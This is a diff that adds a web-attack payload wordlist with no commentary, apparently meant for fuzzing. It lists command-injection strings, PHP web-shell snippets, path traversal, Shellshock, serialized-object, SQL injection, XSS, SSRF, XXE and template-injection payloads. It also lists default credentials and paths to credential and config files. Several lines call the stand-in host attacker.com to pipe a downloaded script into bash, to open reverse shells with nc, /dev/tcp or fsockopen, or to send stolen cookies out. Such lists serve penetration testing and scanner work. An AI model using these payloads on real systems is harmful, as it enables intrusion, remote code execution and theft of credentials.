@@ -1,0 +1,823 @@
+;id
+
+;whoami
+
+;cat /etc/passwd
+
+;ls -la
+
+;uname -a
+
+;netstat -an
+
+;ps aux
+
+|id
+
+|whoami
+
+|cat /etc/passwd
+
+|ls -la
+
+||id
+
+||whoami
+
+&&id
+
+&&whoami
+
+`id`
+
+`whoami`
+
+/bin/bash -c 'id'
+
+/bin/sh -c 'whoami'
+
+;curl http://attacker.com/shell
+
+;wget http://attacker.com/shell
+
+;ping -c 4 127.0.0.1
+
+;sleep 5
+
+;echo $PATH
+
+;env
+
+;system('id')
+
+;exec('whoami')
+
+;passthru('id')
+
+;shell_exec('whoami')
+
+;`/bin/id`
+
+;${@system('id')}
+
+;$(id)
+
+%3Bid
+
+%3Bwhoami
+
+%26%26id
+
+%7Cid
+
+%60id%60
+
+<?php system('id'); ?>
+
+<?php exec('whoami'); ?>
+
+<?php passthru('cat /etc/passwd'); ?>
+
+<?php shell_exec('ls -la'); ?>
+
+<?php eval($_GET['cmd']); ?>
+
+<?php assert($_POST['code']); ?>
+
+<?php include($_GET['file']); ?>
+
+<?php require($_REQUEST['page']); ?>
+
+php://input
+
+php://filter/convert.base64-encode/resource=index.php
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
+
+eval()
+
+assert()
+
+system()
+
+exec()
+
+passthru()
+
+shell_exec()
+
+popen()
+
+proc_open()
+
+pcntl_exec()
+
+create_function()
+
+call_user_func()
+
+call_user_func_array()
+
+preg_replace(/e)
+
+/etc/passwd
+
+/etc/shadow
+
+/etc/hosts
+
+/var/log/apache2/access.log
+
+/var/log/nginx/access.log
+
+/windows/system32/drivers/etc/hosts
+
+/windows/win.ini
+
+../../../../../etc/passwd
+
+../../../../../../windows/win.ini
+
+..%2F..%2F..%2Fetc%2Fpasswd
+
+%00/etc/passwd
+
+http://attacker.com/malicious.php
+
+https://evil.com/shell.txt
+
+file:///etc/passwd
+
+include()
+
+require()
+
+include_once()
+
+require_once()
+
+() { :;}; /bin/bash -c 'id'
+
+() { :;}; /bin/sh -c 'whoami'
+
+() { :;}; echo vulnerable
+
+() { :;}; /bin/bash -c "curl http://attacker.com/shell"
+
+() { :;}; /bin/bash -c "wget http://attacker.com/shell"
+
+() { :;}; /bin/bash -c "ping -c 4 attacker.com"
+
+O:4:"Test":1:{s:4:"code";s:10:"system('id');"}
+
+O:8:"stdClass":1:{s:3:"cmd";s:6:"whoami";}
+
+a:1:{i:0;O:4:"Evil":1:{s:4:"exec";s:10:"system('id');"}}
+
+__wakeup
+
+__destruct
+
+__toString
+
+Serializable
+
+unserialize()
+
+yaml_parse()
+
+pickle.loads()
+
+cmd
+
+command
+
+exec
+
+execute
+
+code
+
+eval
+
+file
+
+path
+
+url
+
+page
+
+template
+
+data
+
+input
+
+payload
+
+script
+
+action
+
+function
+
+method
+
+query
+
+request
+
+param
+
+value
+
+config
+
+setting
+
+plugin
+
+module
+
+.php
+
+.asp
+
+.aspx
+
+.jsp
+
+.py
+
+.rb
+
+.pl
+
+.sh
+
+.cgi
+
+.exe
+
+.bat
+
+.cmd
+
+.jar
+
+.war
+
+.so
+
+.dll
+
+.phtml
+
+.phps
+
+.inc
+
+.conf
+
+.config
+
+.ini
+
+.bak
+
+.old
+
+~1
+
+.swp
+
+.swo
+
+.git
+
+.svn
+
+' OR '1'='1
+
+" OR "1"="1
+
+' OR '1'='1' --
+
+" OR "1"="1" --
+
+' OR '1'='1' /*
+
+1; DROP TABLE users
+
+' UNION SELECT 1,2,3 --
+
+' UNION SELECT username,password FROM users --
+
+admin' --
+
+1' AND SLEEP(5) --
+
+1" AND BENCHMARK(1000000,MD5(1)) --
+
+1; EXEC xp_cmdshell('whoami')
+
+<script>alert('XSS')</script>
+
+<img src=x onerror=alert('XSS')>
+
+<svg onload=alert('XSS')>
+
+" onmouseover=alert('XSS')
+
+javascript:alert('XSS')
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+
+<script src=http://attacker.com/malicious.js></script>
+
+"><script>alert(1)</script>
+
+%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+
+;cat /etc/passwd
+
+|whoami
+
+&&id
+
+||netstat -an
+
+`ping -c 4 127.0.0.1`
+
+%26%26whoami
+
+%7Cwhoami
+
+;curl -s http://attacker.com/shell.sh | bash
+
+;wget http://attacker.com/shell -O /tmp/shell; chmod +x /tmp/shell; /tmp/shell
+
+/proc/self/environ
+
+/proc/self/cmdline
+
+/proc/self/stat
+
+/etc/environment
+
+/etc/profile
+
+~/.bashrc
+
+~/.bash_history
+
+~/.ssh/id_rsa
+
+~/.ssh/authorized_keys
+
+/var/www/html/config.php
+
+/application/config/database.php
+
+.htaccess
+
+.webconfig
+
+wp-config.php
+
+settings.py
+
+config.yaml
+
+config.json
+
+.env
+
+robots.txt
+
+sitemap.xml
+
+crossdomain.xml
+
+clientaccesspolicy.xml
+
+phpinfo()
+
+phpinfo.php
+
+test.php
+
+info.php
+
+debug.php
+
+admin
+
+login
+
+dashboard
+
+api
+
+rest
+
+graphql
+
+websocket
+
+socket.io
+
+admin:admin
+
+root:root
+
+user:password
+
+guest:guest
+
+test:test
+
+default
+
+debug
+
+trace
+
+verbose
+
+log
+
+backup
+
+temp
+
+tmp
+
+staging
+
+dev
+
+prod
+
+internal
+
+private
+
+secret
+
+key
+
+token
+
+password
+
+credential
+
+auth
+
+session
+
+cookie
+
+CRLF
+
+%0D%0A
+
+HTTP/1.1
+
+Host: attacker.com
+
+User-Agent: Mozilla/5.0
+
+X-Forwarded-For: 127.0.0.1
+
+X-Requested-With: XMLHttpRequest
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Type: multipart/form-data
+
+boundary=----WebKitFormBoundary
+
+http://127.0.0.1
+
+http://localhost
+
+http://169.254.169.254/latest/meta-data/
+
+http://[::1]
+
+file:///etc/passwd
+
+gopher://127.0.0.1:6379/_INFO
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>
+
+&xxe;
+
+csrf
+
+token
+
+state
+
+nonce
+
+*)(uid=*
+
+)(|(uid=*
+
+admin*
+
+user*
+
+' or '1'='1
+
+" or "1"="1
+
+//node()
+
+/*/*
+
+{"$ne": null}
+
+{"$gt": ""}
+
+{"$regex": ".*"}
+
+vulnerable
+
+exploit
+
+hack
+
+attack
+
+payload
+
+shell
+
+backdoor
+
+webshell
+
+root
+
+admin
+
+privilege
+
+escalation
+
+bypass
+
+override
+
+execute
+
+inject
+
+upload
+
+download
+
+delete
+
+modify
+
+access
+
+unauthorized
+
+authentication
+
+authorization
+
+session
+
+cookie
+
+token
+
+leak
+
+disclosure
+
+exposure
+
+{{7*7}}
+
+${7*7}
+
+<%= 7*7 %>
+
+#{7*7}
+
+{{system('id')}}
+
+${{`whoami`}}
+
+{{request.__class__.__mro__[2].__subclasses__()}}
+
+{% debug %}
+
+{% include 'malicious_template' %}
+
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Additional Payloads and Patterns
+
+;nc -e /bin/sh attacker.com 4444
+
+;rm -rf /tmp/test; id
+
+;bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+;perl -e 'exec("/bin/sh");'
+
+;python -c 'import os; os.system("id")'
+
+;ruby -e 'system("whoami")'
+
+;powershell -c "whoami"
+
+/bin/cat /etc/passwd
+
+/bin/ls /root
+
+/usr/bin/id
+
+/usr/bin/whoami
+
+/etc/issue
+
+/etc/os-release
+
+/var/log/messages
+
+/var/log/secure
+
+../../../../etc/passwd%00
+
+..%5C..%5C..%5Cwindows%5Cwin.ini
+
+php://filter/read=convert.base64-decode/resource=config.php
+
+data://text/plain,<?php system('whoami'); ?>
+
+expect://id
+
+http://169.254.169.254/latest/user-data
+
+http://127.0.0.1:8080/admin
+
+http://localhost:9200/_cluster/health
+
+gopher://127.0.0.1:27017/_
+
+ftp://attacker.com/malicious.txt
+
+dict://127.0.0.1:6379/INFO
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+
+<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;
+
+{{config.__class__.__init__.__globals__}}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "system" in x.__name__ %}{{x().__init__.__globals__['system']('id')}}{% endif %}{% endfor %}
+
+${{os.system('id')}}
+
+${{__import__('os').system('whoami')}}
+
+1' OR 1=1 LIMIT 1 --
+
+" OR 1=1 LIMIT 1 --
+
+' UNION ALL SELECT NULL,NULL,NULL --
+
+1; EXEC master.dbo.sp_configure 'xp_cmdshell', 1
+
+<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+
+<img src="x" onerror="fetch('http://attacker.com?data='+btoa(document.body.innerHTML))">
+
+<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+
+javascript:void(document.location='http://attacker.com?'+document.cookie)
+
+{"$where": "this.password.match(/.*$/)"}
+
+{"$eval": "db.getCollectionNames()"}
+
+{"username": {"$exists": true}}
+
+/var/www/html/wp-admin/install.php
+
+/etc/nginx/nginx.conf
+
+/etc/apache2/apache2.conf
+
+.ssh/config
+
+.git/config
+
+.bash_profile
+
+.zshrc
+
+mysql.user
+
+information_schema.tables
+
+sys.x$cmd_exec('id')
+
+O:8:"Zend_Log":1:{s:6:"_writers";a:1:{i:0;O:8:"Zend_Log_Writer_Mail":1:{s:7:"_events";a:1:{i:0;s:10:"system('id');"}}}}
+
+O:6:"Logger":1:{s:4:"data";s:10:"system('id');"}
+
+__construct
+
+__call
+
+__get
+
+__set
+
+filter_var()
+
+filter_input()
+
+parse_str()
+
+mb_parse_str()
+
+http://127.0.0.1:22
+
+http://localhost:5432
+
+dns://attacker.com
+
+ldap://127.0.0.1
+
+ldaps://127.0.0.1
+
+*)(objectClass=*
+
+(|(cn=*admin*)
+
+${{T(java.lang.System).getenv()}}
+
+{{app.__class__.__init__.__globals__['os'].system('id')}}
+
+;telnet attacker.com 4444
+
+;mkfifo /tmp/pipe; sh /tmp/pipe | nc attacker.com 4444 > /tmp/pipe
+
+;bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+
+;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+/var/log/auth.log
+
+/etc/group
+
+/etc/aliases
+
+/var/www/html/.htpasswd
+
+/app/config/parameters.yml
+
+/config/secrets.json
+
+secrets.yml
+
+.env.bak
+
+.env.prod
+
+.env.dev
+
+backup.sql
+
+dump.sql
+
+database.yml
+
+settings.ini
+
+config.inc.php
+
+local.xml
+
+index.bak
+
+adminer.php
+
+bigdump.php
